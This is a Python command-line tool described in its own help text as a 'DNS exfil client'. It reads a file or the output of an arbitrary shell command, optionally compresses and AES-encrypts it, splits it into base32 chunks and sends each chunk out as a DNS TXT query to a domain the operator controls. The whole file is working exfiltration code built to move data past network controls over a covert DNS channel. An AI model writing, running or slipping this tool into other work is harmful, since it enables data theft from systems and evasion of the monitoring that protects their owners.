#!/usr/bin/env python3
import argparse
import base64
import hashlib
import os
import socket
import subprocess
import sys
import time
import uuid
import zlib
from pathlib import Path

import dns.message
import dns.rdatatype
import dns.resolver
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def derive_key(k: str) -> bytes:
    try:
        b = bytes.fromhex(k)
        if len(b) == 32:
            return b
    except:
        pass
    return hashlib.sha256(k.encode()).digest()

def build_wire(label: str, rdtype):
    q = dns.message.make_query(label, rdtype)
    return q.to_wire()

def client_main():
    p = argparse.ArgumentParser(description="DNS exfil client")
    p.add_argument("--domain", required=True)
    p.add_argument("--key")
    p.add_argument("-r", "--resolver", help="single DNS server IP")
    p.add_argument("--port", type=int, default=53)
    p.add_argument("-f", "--file")
    p.add_argument("-c", "--command", dest="command")
    p.add_argument("--compress", action="store_true")
    p.add_argument("--session")
    p.add_argument("-cs", "--chunksize", type=int, default=48)
    p.add_argument("--delay", type=float, default=0.01)
    p.add_argument("--debug", action="store_true")
    args = p.parse_args()

    # pick exactly one resolver
    if args.resolver:
        resolver = args.resolver
    else:
        sys_res = dns.resolver.Resolver(configure=True)
        resolver = sys_res.nameservers[0]
    if args.debug:
        print(f"[DEBUG] using resolver: {resolver}")

    # load data
    if args.command:
        data = subprocess.check_output(args.command, shell=True)
    elif args.file:
        data = Path(args.file).read_bytes()
    else:
        p.error("need --file or --command")

    # compress/encrypt as before
    if args.compress:
        data = zlib.compress(data)
    if args.key:
        key = derive_key(args.key)
        aes = AESGCM(key)
        nonce = os.urandom(12)
        data = nonce + aes.encrypt(nonce, data, None)

    # base32 chunking
    sess = (args.session or uuid.uuid4().hex[:8]).lower()
    b32 = base64.b32encode(data).decode().strip("=").lower()
    chunks = [b32[i:i+args.chunksize] for i in range(0, len(b32), args.chunksize)]
    chunks.append("eof")

    total = len(chunks)
    if args.debug:
        print(f"[DEBUG] will send {total} chunks in session {sess}")
    print(f"")
    print(f"[WARNING] Sending more than 1000 chunk files at a time might result in data corruption.")
    print(f"[WARNING] Sending tens of thousands of requests might result in a provider banning or blocking your IP or domain.")
    print(f"[WARNING] You are about to send information over the network using DNS which gets logged by many ISPs and companies.")
    print(f"")
    print(f"[INFO] Smaller files of 500 chunks or less are recommended with encrypt and compress.")
    print(f"[INFO] To use encryption, specify the --key 123,  to use compression, specify --compress")
    ans = input(f"This will send {total} chunks. Continue? [y/N].")
    if ans.lower() != "y":
        print("Aborted.")
        sys.exit(0)

    for idx, chunk in enumerate(chunks):
        label = f"{sess}.{idx}.{chunk}.{args.domain}".lower()
        if args.debug:
            print(f"[DEBUG] sending chunk {idx}: {label}")
        wire = build_wire(label, dns.rdatatype.TXT)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(wire, (resolver, args.port))
            s.close()
        except Exception as e:
            print(f"[ERROR] send failed: {e}", file=sys.stderr)
        time.sleep(args.delay)

    print(f"Sent {total} chunks for session {sess}")

if __name__ == "__main__":
    client_main()
